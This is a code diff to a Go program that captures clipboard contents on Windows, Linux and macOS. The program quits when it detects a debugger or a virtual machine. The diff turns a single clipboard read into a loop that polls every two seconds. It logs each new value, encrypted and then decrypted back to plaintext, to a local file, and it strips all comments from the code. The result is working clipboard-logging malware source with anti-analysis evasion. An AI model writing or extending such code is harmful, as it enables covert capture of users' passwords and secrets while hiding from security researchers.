@@ -15,38 +15,45 @@ import (
 	"unsafe"
 )
 
-// Hardcoded configuration settings
 const (
-	Logging         = true
-	EncryptionKey   = "your_secret_encryption_key"
-	EnableClipboard = true
+	Logging            = true
+	EncryptionKey      = "your_secret_encryption_key"
+	EnableClipboard    = true
+	CheckInterval      = 2 * time.Second
 )
 
 func main() {
-	// Perform anti-debugging and anti-VM checks
 	if isBeingDebugged() || isRunningInVM() {
 		logMessage("Debugger or VM detected. Exiting.")
 		os.Exit(1)
 	}
 
-	// Clipboard operations
 	if EnableClipboard {
-		content, err := readClipboard()
-		if err != nil {
-			logMessage(fmt.Sprintf("Clipboard error: %v", err))
-			return
+		var previousContent string
+		for {
+			content, err := readClipboard()
+			if err != nil {
+				logMessage(fmt.Sprintf("Clipboard error: %v", err))
+				time.Sleep(CheckInterval)
+				continue
+			}
+
+			if content != "" && content != previousContent {
+				encryptedContent := encrypt(content, EncryptionKey)
+				logMessage(fmt.Sprintf("Encrypted Clipboard content: %s", encryptedContent))
+
+				decryptedContent := decrypt(encryptedContent, EncryptionKey)
+				logMessage(fmt.Sprintf("Decrypted Clipboard content: %s", decryptedContent))
+
+				previousContent = content
+			}
+
+			time.Sleep(CheckInterval)
 		}
-
-		encryptedContent := encrypt(content, EncryptionKey)
-		logMessage(fmt.Sprintf("Encrypted Clipboard content: %s", encryptedContent))
-
-		decryptedContent := decrypt(encryptedContent, EncryptionKey)
-		logMessage(fmt.Sprintf("Decrypted Clipboard content: %s", decryptedContent))
 	}
 }
 
 func readClipboard() (string, error) {
-	// Clipboard access for Windows, Linux, and macOS
 	switch runtime.GOOS {
 	case "windows":
 		return readClipboardWindows()
@@ -74,7 +81,7 @@ func readClipboardWindows() (string, error) {
 	}
 	defer closeClipboard.Call()
 
-	cfText := uintptr(1) // CF_TEXT format
+	cfText := uintptr(1)
 	h, _, err := getClipboardData.Call(cfText)
 	if h == 0 {
 		return "", fmt.Errorf("failed to get clipboard data: %v", err)
@@ -86,7 +93,6 @@ func readClipboardWindows() (string, error) {
 	}
 	defer globalUnlock.Call(h)
 
-	// Use safer method to read the memory content
 	var text strings.Builder
 	for {
 		c := *(*byte)(unsafe.Pointer(ptr))
@@ -101,7 +107,6 @@ func readClipboardWindows() (string, error) {
 }
 
 func readClipboardUnix(cmdName string, args ...string) (string, error) {
-	// Unix clipboard access via external command
 	cmd := exec.Command(cmdName, args...)
 	output, err := cmd.Output()
 	if err != nil {
@@ -111,7 +116,6 @@ func readClipboardUnix(cmdName string, args ...string) (string, error) {
 }
 
 func encrypt(plainText, key string) string {
-	// AES encryption of the clipboard content
 	block, err := aes.NewCipher([]byte(createHash(key)))
 	if err != nil {
 		fmt.Println("Failed to create cipher block:", err)
@@ -129,7 +133,6 @@ func encrypt(plainText, key string) string {
 }
 
 func decrypt(cipherText, key string) string {
-	// AES decryption of the encrypted content
 	data, err := base64.StdEncoding.DecodeString(cipherText)
 	if err != nil {
 		fmt.Println("Failed to decode base64 string:", err)
@@ -164,26 +167,24 @@ func decrypt(cipherText, key string) string {
 }
 
 func createHash(key string) string {
-	// SHA-256 hash generation for encryption key
 	hasher := sha256.New()
 	hasher.Write([]byte(key))
-	return fmt.Sprintf("%x", hasher.Sum(nil))[:32] // Use only the first 32 bytes (256 bits) of the hash
+	return fmt.Sprintf("%x", hasher.Sum(nil))[:32]
 }
 
 func logMessage(message string) {
-	// Logging with optional file output
 	timestamp := time.Now().Format("2006-01-02 15:04:05")
 	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)
 	fmt.Print(logEntry)
 
 	if Logging {
-		logFile :=   "tool_log.txt"
+		logFile := "tool_log.txt"
 		f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
 			fmt.Printf("Failed to write to log file: %v\n", err)
 			return
-		}  
-		defer f.Close()  // Ensure the file is closed
+		}
+		defer f.Close()
 
 		if _, err := f.WriteString(logEntry); err != nil {
 			fmt.Printf("Failed to write log entry: %v\n", err)
@@ -192,7 +193,6 @@ func logMessage(message string) {
 }
 
 func isBeingDebugged() bool {
-	// Anti-debugging check for Windows
 	var isDebuggerPresent bool
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
@@ -201,7 +201,6 @@ func isBeingDebugged() bool {
 }
 
 func isRunningInVM() bool {
-	// Anti-VM detection for Windows
 	if runtime.GOOS != "windows" {
 		return false
 	}
@@ -224,7 +223,6 @@ func isRunningInVM() bool {
 }
 
 func isIndicatorPresent(indicator string) bool {
-	// VM indicator detection via PowerShell command
 	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
 	output, err := cmd.Output()
 	if err != nil {
